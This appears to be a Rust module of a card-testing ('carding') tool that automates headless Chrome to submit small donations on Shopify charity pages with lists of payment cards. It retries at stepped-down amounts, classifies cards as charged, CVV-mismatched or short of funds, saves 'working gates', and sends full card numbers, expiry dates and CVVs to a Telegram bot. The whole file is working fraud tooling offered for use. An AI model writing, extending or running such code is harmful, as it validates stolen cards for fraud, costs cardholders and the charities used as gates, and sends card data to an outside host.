use crate::common::{CardData, CheckResult, Gate, BACKOFF_AMOUNTS};
use anyhow::{Context, Result};
use colored::*;
use std::collections::HashMap;
use std::fs;
use std::io::{self, Write};
use std::time::Duration;
use thirtyfour::prelude::*;

/// Try to make a donation with the given amount
async fn try_donation(
    driver: &WebDriver,
    card: &CardData,
    gate_url: &str,
    amount: f64,
) -> Result<String> {
    // Navigate to donation page
    driver.goto(gate_url).await?;
    tokio::time::sleep(Duration::from_secs(3)).await;
    
    // Try to find and fill amount field
    let amount_selectors = vec![
        "input[name*='amount']",
        "input[id*='amount']",
        "input[name*='donation']",
        "input[id*='donation']",
        "input[type='number']",
        "#amount",
        "#donation-amount",
        "#custom-amount",
    ];
    
    let mut amount_filled = false;
    for selector in &amount_selectors {
        if let Ok(element) = driver.find(By::Css(*selector)).await {
            element.click().await?;
            tokio::time::sleep(Duration::from_millis(500)).await;
            element.clear().await?;
            element.send_keys(&amount.to_string()).await?;
            amount_filled = true;
            break;
        }
    }
    
    // If no input field, try clicking amount button
    if !amount_filled {
        let amount_str = format!("${}", amount);
        if let Ok(buttons) = driver.find_all(By::Css("button, a, div[role='button']")).await {
            for button in buttons {
                if let Ok(text) = button.text().await {
                    if text.contains(&amount_str) || text.contains(&amount.to_string()) {
                        button.click().await?;
                        amount_filled = true;
                        break;
                    }
                }
            }
        }
    }
    
    tokio::time::sleep(Duration::from_secs(1)).await;
    
    // Check if we need to switch to Stripe iframe
    let mut in_iframe = false;
    let iframe_selectors = vec!["iframe[name*='stripe']", "iframe[src*='stripe']"];
    
    for selector in &iframe_selectors {
        if let Ok(iframe) = driver.find(By::Css(*selector)).await {
            driver.switch_to().frame_element(&iframe).await?;
            in_iframe = true;
            
            // Fill card in iframe
            if let Ok(card_input) = driver.find(By::Css("input[name='cardnumber'], input[placeholder*='Card']")).await {
                card_input.click().await?;
                tokio::time::sleep(Duration::from_millis(500)).await;
                card_input.send_keys(&card.number).await?;
                
                // Fill expiry
                if let Ok(exp_input) = driver.find(By::Css("input[name='exp-date'], input[placeholder*='MM']")).await {
                    exp_input.click().await?;
                    tokio::time::sleep(Duration::from_millis(300)).await;
                    exp_input.send_keys(&format!("{}{}", card.month, &card.year[2..])).await?;
                }
                
                // Fill CVV
                if let Ok(cvv_input) = driver.find(By::Css("input[name='cvc'], input[placeholder*='CVC']")).await {
                    cvv_input.click().await?;
                    tokio::time::sleep(Duration::from_millis(300)).await;
                    cvv_input.send_keys(&card.cvv).await?;
                }
                
                driver.switch_to().default_content().await?;
                break;
            }
        }
    }
    
    // If not in iframe, fill directly
    if !in_iframe {
        // Card number
        let card_selectors = vec![
            "input[name*='card']",
            "input[id*='card']",
            "input[autocomplete='cc-number']"
        ];
        
        for selector in &card_selectors {
            if let Ok(element) = driver.find(By::Css(*selector)).await {
                element.click().await?;
                tokio::time::sleep(Duration::from_millis(500)).await;
                element.send_keys(&card.number).await?;
                break;
            }
        }
        
        // Month
        for selector in &["input[name*='month']", "select[name*='month']"] {
            if let Ok(element) = driver.find(By::Css(*selector)).await {
                element.click().await?;
                tokio::time::sleep(Duration::from_millis(300)).await;
                element.send_keys(&card.month).await?;
                break;
            }
        }
        
        // Year
        for selector in &["input[name*='year']", "select[name*='year']"] {
            if let Ok(element) = driver.find(By::Css(*selector)).await {
                element.click().await?;
                tokio::time::sleep(Duration::from_millis(300)).await;
                element.send_keys(&card.year).await?;
                break;
            }
        }
        
        // CVV
        for selector in &["input[name*='cvv']", "input[name*='cvc']", "input[id*='cvv']"] {
            if let Ok(element) = driver.find(By::Css(*selector)).await {
                element.click().await?;
                tokio::time::sleep(Duration::from_millis(300)).await;
                element.send_keys(&card.cvv).await?;
                break;
            }
        }
    }
    
    // Fill email and name
    if let Ok(email) = driver.find(By::Css("input[type='email'], input[name*='email']")).await {
        email.click().await?;
        tokio::time::sleep(Duration::from_millis(300)).await;
        email.send_keys("donor@example.com").await?;
    }
    
    if let Ok(name) = driver.find(By::Css("input[name*='name'], input[id*='name']")).await {
        name.click().await?;
        tokio::time::sleep(Duration::from_millis(300)).await;
        name.send_keys("Test Donor").await?;
    }
    
    tokio::time::sleep(Duration::from_secs(1)).await;
    
    // Find and click submit button
    let submit_selectors = vec![
        "button[type='submit']",
        "input[type='submit']",
        "#submit",
        "#donate-button",
    ];
    
    for selector in &submit_selectors {
        if let Ok(button) = driver.find(By::Css(*selector)).await {
            button.click().await?;
            break;
        }
    }
    
    // Wait for response
    tokio::time::sleep(Duration::from_secs(5)).await;
    
    // Get page content to analyze result
    let page_source = driver.source().await?;
    let content_lower = page_source.to_lowercase();
    
    // Analyze response
    if content_lower.contains("thank you") 
        || content_lower.contains("success") 
        || content_lower.contains("donation received")
        || content_lower.contains("payment successful") {
        return Ok("CHARGED".to_string());
    }
    
    // CVV mismatch indicators
    let cvv_indicators = [
        "incorrect_cvc", "invalid_cvc", "incorrect cvc", "invalid cvc",
        "security code is incorrect", "security code is invalid",
        "cvv is incorrect", "cvc is incorrect",
        "card's security code is incorrect",
    ];
    
    for indicator in &cvv_indicators {
        if content_lower.contains(indicator) {
            return Ok("CVV_MISMATCH".to_string());
        }
    }
    
    // Insufficient funds
    if content_lower.contains("insufficient funds") || content_lower.contains("insufficient_funds") {
        return Ok("INSUFFICIENT_FUNDS".to_string());
    }
    
    // Declined
    Ok("DECLINED".to_string())
}

/// Check card on gate with exponential backoff
async fn check_card_on_gate(
    driver: &WebDriver,
    card: &CardData,
    gate: &Gate,
) -> Result<Option<CheckResult>> {
    println!("\n{}", format!("Testing gate: {}", gate.url).yellow());
    
    for &amount in &BACKOFF_AMOUNTS {
        print!("  {} Trying ${}... ", "→".cyan(), amount);
        io::stdout().flush()?;
        
        match try_donation(driver, card, &gate.url, amount).await {
            Ok(status) => {
                if status == "CHARGED" || status == "CVV_MISMATCH" || status == "INSUFFICIENT_FUNDS" {
                    println!("{} {}!", "✓".green(), status.green());
                    return Ok(Some(CheckResult {
                        gate: gate.url.clone(),
                        card: card.masked(),
                        amount,
                        status,
                        success: true,
                    }));
                } else {
                    println!("{} {}", "✗".red(), status.red());
                }
            }
            Err(e) => {
                println!("{} {}", "✗".red(), format!("Error: {}", e).red());
            }
        }
        
        tokio::time::sleep(Duration::from_secs(2)).await;
    }
    
    println!("  {} {}", "✗".red(), "Declined at all amounts".red());
    Ok(None)
}

/// Get cards from user input
pub fn get_cards_from_input() -> Result<Vec<CardData>> {
    println!("{}", "Enter cards (format: number|month|year|cvv)".yellow());
    println!("{}\n", "Press Enter on empty line when done".dimmed());
    
    let mut cards = Vec::new();
    loop {
        print!("Card: ");
        io::stdout().flush()?;
        
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
        let input = input.trim();
        
        if input.is_empty() {
            break;
        }
        
        match CardData::from_string(input) {
            Ok(card) => {
                println!("{} Added: {}", "✓".green(), card.masked());
                cards.push(card);
            }
            Err(e) => {
                println!("{} {}", "✗".red(), e);
            }
        }
    }
    
    if cards.is_empty() {
        anyhow::bail!("No cards entered");
    }
    
    Ok(cards)
}

/// Display final results
pub fn display_results(all_results: &[CheckResult]) {
    println!("\n{}", "═".repeat(60));
    println!("{}", "✅ FINAL RESULTS".bold().green());
    println!("{}\n", "═".repeat(60));
    
    if all_results.is_empty() {
        println!("{}", "❌ No successful charges found".red());
        println!("{}", "All cards declined on all gates".yellow());
    } else {
        // Group by amount
        let mut by_amount: HashMap<String, Vec<&CheckResult>> = HashMap::new();
        for result in all_results {
            let key = format!("{:.2}", result.amount);
            by_amount.entry(key).or_insert_with(Vec::new).push(result);
        }
        
        let mut amounts: Vec<_> = by_amount.keys().collect();
        amounts.sort_by(|a, b| b.parse::<f64>().unwrap().partial_cmp(&a.parse::<f64>().unwrap()).unwrap());
        
        for amount_str in amounts {
            let results = &by_amount[amount_str];
            println!("{} {} ({} found):", "💰".bold(), format!("${} Gates", amount_str).bold().yellow(), results.len());
            
            for result in results {
                println!("  {} {}", "✓".green(), result.gate);
                println!("    Card: {}", result.card);
                println!("    Status: {}\n", result.status.green());
            }
        }
    }
}

/// Load cards from file
pub fn load_cards_from_file(file_path: &str) -> Result<Vec<CardData>> {
    let content = fs::read_to_string(file_path)
        .context(format!("Failed to read cards file: {}", file_path))?;
    
    let mut cards = Vec::new();
    for (line_num, line) in content.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue; // Skip empty lines and comments
        }
        
        match CardData::from_string(line) {
            Ok(card) => {
                println!("{} Loaded card: {}", "✓".green(), card.masked());
                cards.push(card);
            }
            Err(e) => {
                println!("{} Line {}: {}", "✗".yellow(), line_num + 1, e);
            }
        }
    }
    
    if cards.is_empty() {
        anyhow::bail!("No valid cards found in file");
    }
    
    Ok(cards)
}

/// Run the checker
pub async fn run_checker(
    gates_file: &str, 
    output_file: &str, 
    max_gates: Option<usize>,
    cards_file: Option<&str>,
    telegram_config: Option<&str>,
) -> Result<()> {
    println!("\n{}", "🛍️  Shopify Donation Checker (Rust + Browser Automation)".bold().cyan());
    println!("{}\n", "No API keys needed - fills forms like a real user!".dimmed());
    
    // Load Telegram config if provided
    let telegram_cfg = if let Some(config_path) = telegram_config {
        match crate::telegram::load_config(config_path) {
            Ok(cfg) => {
                println!("{} Telegram notifications enabled", "✓".green());
                Some(cfg)
            }
            Err(e) => {
                println!("{} Failed to load Telegram config: {}", "✗".yellow(), e);
                println!("{} Continuing without Telegram notifications", "→".cyan());
                None
            }
        }
    } else {
        None
    };
    
    // Load donation gates
    let gates_json = fs::read_to_string(gates_file)
        .context("Failed to read gates file. Run 'shopify_checker analyze' first!")?;
    let gates: Vec<Gate> = serde_json::from_str(&gates_json)?;
    
    println!("{} Loaded {} donation gates\n", "✓".green(), gates.len());
    
    // Get cards - from file or stdin
    let cards = if let Some(file_path) = cards_file {
        println!("{}", format!("Loading cards from file: {}", file_path).yellow());
        load_cards_from_file(file_path)?
    } else {
        get_cards_from_input()?
    };
    
    // Determine how many gates to test
    let gates_to_test = if let Some(max) = max_gates {
        &gates[..max.min(gates.len())]
    } else {
        &gates[..]
    };
    
    println!("\n{} Will test {} card(s) on {} gate(s)", "✓".green(), cards.len(), gates_to_test.len());
    println!("{} Strategy: $35 → $25 → $14.99 → $4.99 → $2 → $1\n", "→".cyan());
    
    print!("Proceed? (y/n): ");
    io::stdout().flush()?;
    let mut input = String::new();
    io::stdin().read_line(&mut input)?;
    
    if input.trim().to_lowercase() != "y" {
        return Ok(());
    }
    
    // Setup WebDriver
    println!("\n{} Launching headless Chrome...", "→".cyan());
    
    let mut caps = DesiredCapabilities::chrome();
    caps.add_arg("--headless")?;
    caps.add_arg("--no-sandbox")?;
    caps.add_arg("--disable-dev-shm-usage")?;
    caps.add_arg("--disable-gpu")?;
    caps.add_arg("--window-size=1920,1080")?;
    caps.add_arg("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")?;
    
    let driver = WebDriver::new("http://localhost:9515", caps).await?;
    driver.set_page_load_timeout(Duration::from_secs(30)).await?;
    
    println!("{} Browser ready\n", "✓".green());
    
    // Check cards with smart retry logic
    let mut all_results = Vec::new();
    
    for card in &cards {
        println!("\n{}", format!("═══ Testing card: {} ═══", card.masked()).bold().cyan());
        
        let mut card_succeeded = false;
        
        // Try card on each gate until it succeeds
        for gate in gates_to_test {
            if let Ok(Some(result)) = check_card_on_gate(&driver, card, gate).await {
                // Card succeeded on this gate
                all_results.push(result.clone());
                
                // Send to Telegram if configured
                if let Some(ref cfg) = telegram_cfg {
                    // Lookup BIN info
                    let bin = if card.number.len() >= 6 {
                        &card.number[..6]
                    } else {
                        "UNKNOWN"
                    };
                    
                    let bin_info = crate::bin_lookup::lookup_bin(bin).unwrap_or_default();
                    
                    // Send notification
                    if let Err(e) = crate::telegram::notify_success(
                        cfg,
                        &format!("{}|{}|{}|{}", card.number, card.month, card.year, card.cvv),
                        &result.gate,
                        result.amount,
                        &result.status,
                        &bin_info,
                    ) {
                        println!("{} Failed to send Telegram notification: {}", "✗".yellow(), e);
                    }
                }
                
                card_succeeded = true;
                break; // Move to next card
            }
            
            tokio::time::sleep(Duration::from_secs(3)).await;
        }
        
        if !card_succeeded {
            println!("{} Card {} failed on all gates", "✗".red(), card.masked());
        }
    }
    
    // Close browser
    driver.quit().await?;
    
    // Display results
    display_results(&all_results);
    
    // Save results
    if !all_results.is_empty() {
        let json = serde_json::to_string_pretty(&all_results)?;
        fs::write(output_file, json)?;
        println!("{} Results saved to {}", "✓".green(), output_file);
        
        // Save working gates separately
        let working_gates: Vec<String> = all_results
            .iter()
            .filter(|r| r.status == "CHARGED" || r.status == "CVV_MISMATCH" || r.status == "INSUFFICIENT_FUNDS")
            .map(|r| r.gate.clone())
            .collect();
        
        if !working_gates.is_empty() {
            // Remove duplicates
            let mut unique_gates: Vec<String> = working_gates.clone();
            unique_gates.sort();
            unique_gates.dedup();
            
            let working_gates_file = output_file.replace(".json", "_working_gates.json");
            let working_json = serde_json::to_string_pretty(&unique_gates)?;
            fs::write(&working_gates_file, working_json)?;
            println!("{} Working gates saved to {}", "✓".green(), working_gates_file);
            println!("{} Working gates saved to {}", "✓".green(), working_gates_file);
            println!("{} Found {} unique working gates", "→".cyan(), unique_gates.len());
            
            // Also save as simple text file for easy use
            let working_gates_txt = output_file.replace(".json", "_working_gates.txt");
            fs::write(&working_gates_txt, unique_gates.join("\n"))?;
            println!("{} Working gates also saved to {} (text format)", "✓".green(), working_gates_txt);
        }
    }
    
    Ok(())
}
